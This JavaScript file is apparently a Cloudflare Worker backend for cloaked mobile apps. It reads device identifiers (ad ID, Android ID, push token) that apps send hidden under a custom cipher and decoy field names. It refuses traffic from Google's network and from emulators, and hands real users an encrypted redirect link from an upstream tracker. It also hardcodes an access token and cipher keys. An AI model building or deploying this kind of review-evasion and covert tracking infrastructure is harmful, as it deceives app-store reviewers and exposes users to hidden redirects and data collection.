/**
 * Cloudflare Worker — Unity-style sync intake (Cookie + encrypted body).
 *
 * Colossus (Lorenz-inspired). Local device/Google filters only;
 * spectoring/adspect lives on the upstream API (click-trusted), not here.
 * No HEAD follow on the upstream link. Result returned sync in HTTP body.
 *
 * Secrets:
 *   ACCESS_TOKEN_ENABLE   # upstream click token
 *
 * Endpoint: POST https://<host>/   (or any path)
 *   Cookie: data=<url-encoded Colossus hex of pipe fields>
 *   Body:   url-encoded Colossus hex of form fields (whole body)
 *   Also accepts X-Data header (same value as Cookie data=) for RN clients.
 */

const UPSTREAM_URL = "https://banda-track-api.space/api/click-trusted";

const BLOCK_MONITOR_URL =
  "https://adjust-binom-monitor.oleksandr-teamlead-unitydev.workers.dev/api/block-events";
const BLOCK_MONITOR_TOKEN =
  "73bcf638be7f5e6e3d2bea45852d3b5f22cf0ffd14706051a88a45c548e5f526";

/* cf-protocol-begin */
const CF_PROTOCOL = {
  "transport": "fetch",
  "path": "/qa",
  "cookieName": "cosefo",
  "headerName": "X-Dis",
  "fieldRoutes": {
    "appId": "body",
    "deviceID": "body",
    "adId": "cookie",
    "pushToken": "cookie",
    "referer": "cookie",
    "oneLink": "cookie",
    "naming": "header",
    "userAgent": "cookie",
    "app_version": "header",
    "androidId": "cookie",
    "event": "header",
    "device_model": "cookie",
    "manufacturer": "header",
    "locale": "cookie",
    "timezone": "body",
    "network": "header",
    "screen": "header",
    "session_id": "header",
    "play_integrity_token": "body"
  },
  "cookieLayout": [
    "pushToken",
    "referer",
    "pad",
    "pad",
    "oneLink",
    "androidId",
    "adId",
    "device_model",
    "userAgent",
    "locale",
    "pad"
  ],
  "headerLayout": [
    "pad",
    "network",
    "manufacturer",
    "naming",
    "screen",
    "app_version",
    "event",
    "session_id"
  ],
  "dummyBodyKeys": [
    "koxino",
    "honepe"
  ],
  "extraQuery": {
    "xut": "dame",
    "kig": "fiw"
  },
  "responseKeys": {
    "redirectUrl": "bo",
    "redirectUrlInitial": "cur",
    "error": "nuq",
    "blockUser": "bop"
  },
  "extraResponsePads": {
    "rif": "limaqohu",
    "zuf": "nomonovu",
    "zo": "duwane"
  }
};
/* cf-protocol-end */

const REQUIRED_FIELDS = [
  "appId",
  "deviceID",
  "adId",
  "pushToken",
  "referer",
  "oneLink",
  "naming",
  "userAgent",
  "app_version",
  "androidId"
];

/* ============================= */
/* Colossus (Lorenz-inspired)    */
/* https://en.wikipedia.org/wiki/Colossus_computer */
/* ============================= */

const COLOSSUS_KEY_STRING = "UC8W2vuF5ZfTYJwyF4sFrhqsCYDz";
const COLOSSUS_IV_STRING = "y8cCieTQDFiooj6nJz";
const COLOSSUS_KEY_BYTES = new TextEncoder().encode(COLOSSUS_KEY_STRING);
const COLOSSUS_IV_BYTES = new TextEncoder().encode(COLOSSUS_IV_STRING);

const CHI_LENS = [41, 31, 29, 26, 23, 43, 47, 37];
const PSI_LENS = [43, 47, 51, 53, 59, 61, 67, 71];
const MU_LENS = [61, 37];

function seedState(keyBytes) {
  let s = 2166136261;
  const bytes = keyBytes instanceof Uint8Array ? keyBytes : new Uint8Array(keyBytes || []);
  for (let i = 0; i < bytes.length; i++) {
    s ^= bytes[i];
    s = Math.imul(s, 16777619);
  }
  if (bytes.length === 0) s ^= 0xa5a5a5a5;
  return s >>> 0;
}

function nextU32(state) {
  let x = state[0] >>> 0;
  x ^= x << 13;
  x >>>= 0;
  x ^= x >>> 17;
  x ^= x << 5;
  x >>>= 0;
  state[0] = x;
  return x;
}

function fillWheel(st, len) {
  const pins = new Uint8Array(len);
  let ones = 0;
  for (let i = 0; i < len; i++) {
    pins[i] = nextU32(st) & 1;
    ones += pins[i];
  }
  if (ones === 0) pins[0] = 1;
  if (ones === len) pins[0] = 0;
  const pos = nextU32(st) % len;
  return { pins, pos, len };
}

function colossusTransform(data, keyBytes) {
  const src = data instanceof Uint8Array ? data : new Uint8Array(data || []);
  const st = [seedState(keyBytes)];
  const chi = CHI_LENS.map((len) => fillWheel(st, len));
  const psi = PSI_LENS.map((len) => fillWheel(st, len));
  const mu = MU_LENS.map((len) => fillWheel(st, len));
  const out = new Uint8Array(src.length);
  for (let i = 0; i < src.length; i++) {
    let chiB = 0;
    let psiB = 0;
    for (let b = 0; b < 8; b++) {
      chiB |= chi[b].pins[chi[b].pos] << b;
      psiB |= psi[b].pins[psi[b].pos] << b;
    }
    out[i] = src[i] ^ chiB ^ psiB;
    for (let b = 0; b < 8; b++) {
      chi[b].pos = (chi[b].pos + 1) % chi[b].len;
    }
    const mu0 = mu[0].pins[mu[0].pos];
    mu[0].pos = (mu[0].pos + 1) % mu[0].len;
    if (mu0) {
      mu[1].pos = (mu[1].pos + 1) % mu[1].len;
    }
    if (mu[1].pins[mu[1].pos]) {
      for (let b = 0; b < 8; b++) {
        psi[b].pos = (psi[b].pos + 1) % psi[b].len;
      }
    }
  }
  return out;
}

function encryptBytes(data, key = COLOSSUS_KEY_BYTES) {
  return colossusTransform(data, key);
}

function decryptBytes(data, key = COLOSSUS_KEY_BYTES, _legacyIv = COLOSSUS_IV_BYTES) {
  return colossusTransform(data, key);
}

function bytesToHex(bytes) {
  return Array.from(bytes, (b) => b.toString(16).padStart(2, "0").toUpperCase()).join("");
}

function encryptHex(plain, key = COLOSSUS_KEY_BYTES) {
  return bytesToHex(encryptBytes(new TextEncoder().encode(plain), key));
}

function colossusDecrypt(buffer) {
  return decryptBytes(buffer, COLOSSUS_KEY_BYTES, COLOSSUS_IV_BYTES);
}

function colossusEncryptToHex(jsonStr) {
  return encryptHex(jsonStr, COLOSSUS_KEY_BYTES);
}

function typexDecrypt(buffer) {
  return colossusDecrypt(buffer);
}

function typexEncryptToHex(jsonStr) {
  return colossusEncryptToHex(jsonStr);
}

function hexToBytes(hex) {
  const normalized = String(hex || "").trim();
  if (!normalized || normalized.length % 2 !== 0) {
    throw new Error("Invalid hex");
  }
  const out = new Uint8Array(normalized.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(normalized.substr(i * 2, 2), 16);
  }
  return out;
}

function decryptHexString(hex) {
  try {
    const bytes = hexToBytes(hex);
    const decrypted = decryptBytes(bytes, COLOSSUS_KEY_BYTES, COLOSSUS_IV_BYTES);
    return new TextDecoder().decode(decrypted);
  } catch {
    return "";
  }
}

function encryptHexString(plain) {
  return encryptHex(plain, COLOSSUS_KEY_BYTES);
}

function encryptedJsonResponse(obj, status = 200) {
  const keys = (typeof CF_PROTOCOL !== "undefined" && CF_PROTOCOL.responseKeys) || {};
  const mapped = {};
  if (obj.redirectUrl != null) mapped[keys.redirectUrl || "redirectUrl"] = obj.redirectUrl;
  if (obj.redirectUrlInitial != null) mapped[keys.redirectUrlInitial || "redirectUrlInitial"] = obj.redirectUrlInitial;
  if (obj.error != null) mapped[keys.error || "error"] = obj.error;
  if (obj.blockUser != null) mapped[keys.blockUser || "blockUser"] = obj.blockUser;
  Object.assign(mapped, (CF_PROTOCOL && CF_PROTOCOL.extraResponsePads) || {});
  const json = JSON.stringify(Object.keys(mapped).length ? mapped : obj);
  const encrypted = encryptHexString(json);

  
  return new Response(encrypted, {
    status,
    headers: {
      "Content-Type": "text/plain; charset=utf-8",
      "Cache-Control": "no-store"
    }
  });
}

function emptyResponse(reason = "empty") {
  
  return new Response("", {
    status: 200,
    headers: {
      "Cache-Control": "no-store"
    }
  });
}

function clean(value, max = 2048) {
  return String(value || "").trim().slice(0, max);
}

function isUnusedIntakeField(key) {
  if (key === "play_integrity_token") return true;
  const dummies = (CF_PROTOCOL && CF_PROTOCOL.dummyBodyKeys) || [];
  return dummies.indexOf(key) >= 0;
}

function multiDecode(value) {
  let raw = String(value || "").trim();

  for (let i = 0; i < 3; i++) {
    try {
      const decoded = decodeURIComponent(raw);
      if (decoded === raw) break;
      raw = decoded;
    } catch {
      break;
    }
  }

  return raw.trim();
}

function decryptStrict(value, label = "value") {
  const raw = multiDecode(value);

  if (!raw) return "";

  if (!/^[0-9a-fA-F]+$/.test(raw)) {
        return "";
  }

  const decoded = decryptHexString(raw);

  if (!decoded) {
        return "";
  }

  return decoded;
}

function parseMaybeJson(value) {
  const raw = clean(value, 4096);
  if (!raw) return "";

  try {
    return JSON.parse(raw);
  } catch {
    return raw;
  }
}

function getCookie(request, name) {
  const cookie = request.headers.get("Cookie") || "";
  const match = cookie.match(new RegExp(`${name}=([^;]+)`));
  return match ? match[1] : "";
}

function cleanUrl(value) {
  const raw = clean(value, 4096);
  if (!raw) return "";

  try {
    const url = new URL(raw);
    if (url.protocol !== "http:" && url.protocol !== "https:") return "";
    return url.toString();
  } catch {
    return "";
  }
}

function readEncryptedCookiePayload(request) {
  const encryptedCookieData =
    getCookie(request, CF_PROTOCOL.cookieName) || request.headers.get(CF_PROTOCOL.headerName) || "";
  const decrypted = decryptStrict(encryptedCookieData, "cookie.data");

  if (!decrypted) {
    return { ok: false, payload: null };
  }

  
  const parts = decrypted.split("|");
  const out = {};
  let pi = 0;
  const layout = CF_PROTOCOL.cookieLayout || REQUIRED_FIELDS;
  for (let i = 0; i < layout.length; i++) {
    const slot = layout[i];
    if (slot === "pad") {
      pi++;
      continue;
    }
    out[slot] = clean(parts[pi++] || "", 4096);
  }

  out.naming = parseMaybeJson(out.naming);

  
  return { ok: true, payload: out };
}

function parseWholeEncryptedBody(text) {
  const decrypted = decryptStrict(text, "body.whole");

  if (!decrypted) {
        return {};
  }

  
  const params = new URLSearchParams(decrypted);
  const out = {};

  for (const [key, value] of params.entries()) {
    if (isUnusedIntakeField(key)) {
      continue;
    }
    out[key] = clean(value, 4096);
  }

  
  return out;
}

async function readFormBody(request) {
  const text = await request.text();

  
  const params = new URLSearchParams(text);
  const out = {};
  let parsedFieldsCount = 0;

  for (const [key, value] of params.entries()) {
    if (isUnusedIntakeField(key)) {
      continue;
    }

    const decryptedValue = decryptStrict(value, `body.${key}`);

    if (decryptedValue) {
      out[key] = decryptedValue;
      parsedFieldsCount++;

          }
  }

  if (parsedFieldsCount > 0) {
        return out;
  }

  
  return parseWholeEncryptedBody(text);
}

async function getCCByIp(ip) {
  try {
    if (!ip || ip === "unknown") return null;

    const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,countryCode,message`;
    const resp = await fetch(url);
    const data = await resp.json();

    if (data.status === "success") {
            return data.countryCode;
    }

    
    return null;
  } catch {
    return null;
  }
}

async function resolveCountry(request, ip) {
  const cfCountry = request.cf?.country || "";

  if (cfCountry) {
        return cfCountry;
  }

  return await getCCByIp(ip);
}

function isGoogleProvider(request) {
  const asOrg = request.cf?.asOrganization || "";
  const asn = request.cf?.asn;

  if (asn === 15169) return true;
  if (!asOrg) return false;
  return asOrg.toLowerCase().includes("google");
}

function isEmulatorUA(ua) {
  if (!ua) return true;

  const u = ua.toLowerCase();

  return (
    u.includes("sdk_gphone") ||
    u.includes("emulator") ||
    u.includes("generic") ||
    u.includes("google_sdk") ||
    u.includes("headless") ||
    u.includes("bot") ||
    u.includes("crawl")
  );
}

function reportBlock(ctx, {
  appId,
  blockedBy,
  reason,
  httpStatus = null,
  ip = null,
  adid = null,
  androidId = null,
}) {
  if (!ctx || !BLOCK_MONITOR_URL || !BLOCK_MONITOR_TOKEN) return;

  const id = String(appId || "").trim();
  const source = String(blockedBy || "").trim();
  if (!id || !source) {
    console.error("[block-monitor] skip invalid appId or blockedBy", reason);
    return;
  }

  ctx.waitUntil(
    fetch(BLOCK_MONITOR_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${BLOCK_MONITOR_TOKEN}`,
      },
      body: JSON.stringify({
        appId: id,
        blockedBy: source,
        reason,
        httpStatus,
        ip,
        adid,
        androidId,
        occurredAt: new Date().toISOString(),
      }),
    })
      .then(async (response) => {
        if (!response.ok) {
          const detail = await response.text().catch(() => "");
          throw new Error(`Block monitor returned ${response.status} ${detail}`.trim());
        }
      })
      .catch((error) => {
        console.error("[block-monitor]", error.message);
      }),
  );
}

/* cf-channels-begin */
function parseLayoutPipe(decrypted, layout) {
  const parts = String(decrypted || "").split("|");
  const out = {};
  let pi = 0;
  const slots = layout || [];
  for (let i = 0; i < slots.length; i++) {
    const slot = slots[i];
    if (slot === "pad") {
      pi++;
      continue;
    }
    out[slot] = clean(parts[pi++] || "", 4096);
  }
  return out;
}

function readEncryptedPipe(raw, layout, label) {
  if (!layout || !layout.some((slot) => slot && slot !== "pad")) return {};
  const decrypted = decryptStrict(raw, label);
  if (!decrypted) return {};
  return parseLayoutPipe(decrypted, layout);
}

function readChannelFields(request) {
  const cookieRaw = getCookie(request, CF_PROTOCOL.cookieName);
  const headerRaw = request.headers.get(CF_PROTOCOL.headerName) || "";
  const cookie = readEncryptedPipe(cookieRaw, CF_PROTOCOL.cookieLayout, "cookie.pipe");
  const header = readEncryptedPipe(headerRaw, CF_PROTOCOL.headerLayout, "header.pipe");
  if (cookie.naming) cookie.naming = parseMaybeJson(cookie.naming);
  if (header.naming) header.naming = parseMaybeJson(header.naming);
  return { cookie, header };
}

function takeField(cookie, header, body, key) {
  const value = cookie[key] ?? header[key] ?? body[key] ?? "";
  return value;
}
/* cf-channels-end */

export default {
  async fetch(request, env, ctx) {
    try {
      const url = new URL(request.url);

      if (url.pathname === "/favicon.ico") {
        return emptyResponse("favicon");
      }

      // Plain GET healthcheck only — skip WebSocket upgrade handshake
      const upgrade = (request.headers.get("Upgrade") || "").toLowerCase();
      if (request.method === "GET" && upgrade !== "websocket") {
        return new Response("OK", { status: 200 });
      }

      if (request.method !== "POST") {
                return emptyResponse("method_not_allowed");
      }

      const ip =
        request.headers.get("cf-connecting-ip") ||
        request.headers.get("x-forwarded-for") ||
        "unknown";

      console.log("[cf] запрос", request.method, url.pathname + url.search, ip);

      const country = await resolveCountry(request, ip);

      
      const channels = readChannelFields(request);
      const cookiePayload = channels.cookie || {};
      const headerPayload = channels.header || {};
      const body = await readFormBody(request);
      if (body.naming) body.naming = parseMaybeJson(body.naming);

      const payload = {
        appId: clean(takeField(cookiePayload, headerPayload, body, "appId"), 160),
        deviceID: clean(takeField(cookiePayload, headerPayload, body, "deviceID"), 256),
        adId: clean(takeField(cookiePayload, headerPayload, body, "adId"), 256),
        pushToken: clean(takeField(cookiePayload, headerPayload, body, "pushToken"), 2048),
        referer: clean(takeField(cookiePayload, headerPayload, body, "referer"), 4096),
        oneLink: clean(takeField(cookiePayload, headerPayload, body, "oneLink"), 4096),
        naming: takeField(cookiePayload, headerPayload, body, "naming") || parseMaybeJson(body.naming),
        userAgent: clean(takeField(cookiePayload, headerPayload, body, "userAgent"), 2048),
        app_version: clean(takeField(cookiePayload, headerPayload, body, "app_version"), 128),
        androidId: clean(takeField(cookiePayload, headerPayload, body, "androidId"), 256),
        event: clean(takeField(cookiePayload, headerPayload, body, "event") || "app_start", 128),
        os_version: clean(takeField(cookiePayload, headerPayload, body, "os_version") || body.android_version || "", 128),
        device_model: clean(takeField(cookiePayload, headerPayload, body, "device_model"), 256),
        manufacturer: clean(takeField(cookiePayload, headerPayload, body, "manufacturer"), 128),
        locale: clean(takeField(cookiePayload, headerPayload, body, "locale"), 64),
        timezone: clean(takeField(cookiePayload, headerPayload, body, "timezone"), 128),
        network: clean(takeField(cookiePayload, headerPayload, body, "network"), 64),
        screen: clean(takeField(cookiePayload, headerPayload, body, "screen"), 64),
        session_id: clean(takeField(cookiePayload, headerPayload, body, "session_id"), 256),
        ip
      };

      
      const ua = payload.userAgent || "";
      const googleBlocked = isGoogleProvider(request);
      const emulatorBlocked = isEmulatorUA(ua);
      
      if (googleBlocked || emulatorBlocked) {
        const reason = googleBlocked ? "google_provider" : "emulator_ua";
                reportBlock(ctx, {
          appId: payload.appId,
          blockedBy: "api",
          reason,
          httpStatus: 202,
          ip,
          adid: payload.adId || payload.deviceID || null,
          androidId: payload.androidId || null,
        });
        console.log("[cf] заблокировано", reason, payload.appId || "");
        return encryptedJsonResponse({ error: "error_202" });
      }

      const upstream = await fetch(UPSTREAM_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Forwarded-For": ip,
          "X-Client-IP": ip,
          "CF-Country": country || "",
          "CF-Ray": request.headers.get("cf-ray") || "",
          "X-Click-Token": env.ACCESS_TOKEN_ENABLE || ""
        },
        body: JSON.stringify(payload)
      });

      const upstreamStatus = upstream.status;
      const textResponse = await upstream.text();

      
      if (upstreamStatus === 202) {
                reportBlock(ctx, {
          appId: payload.appId,
          blockedBy: "api",
          reason: "banda_202",
          httpStatus: upstreamStatus,
          ip,
          adid: payload.adId || payload.deviceID || null,
          androidId: payload.androidId || null,
        });
        console.log("[cf] заблокировано", "banda_202", payload.appId || "");
        return encryptedJsonResponse({
          error: "error_202"
        });
      }

      const cleanResponse = textResponse
        .trim()
        .replace(/^"+|"+$/g, "")
        .replace(/^'+|'+$/g, "")
        .replace(/\\/g, "");

      const redirectInitial = cleanUrl(cleanResponse);

      
      if (upstreamStatus === 200 && redirectInitial) {
        // No HEAD follow on the obtained link (Unity HEAD removed).
        const link =
          redirectInitial +
          (redirectInitial.includes("?") ? "&" : "?") +
          "sub_id_12=trusted";

        
        
        console.log("[cf] в приложение", link);
        return encryptedJsonResponse({
          redirectUrlInitial: link
        });
      }

      
      
      console.log("[cf] заблокировано", "invalid_upstream_response", upstreamStatus);
      return emptyResponse("invalid_upstream_response");

    } catch (err) {
            console.log("[cf] заблокировано", "worker_error", err && err.message ? err.message : "");
            return emptyResponse("worker_error");
    }
  }
};
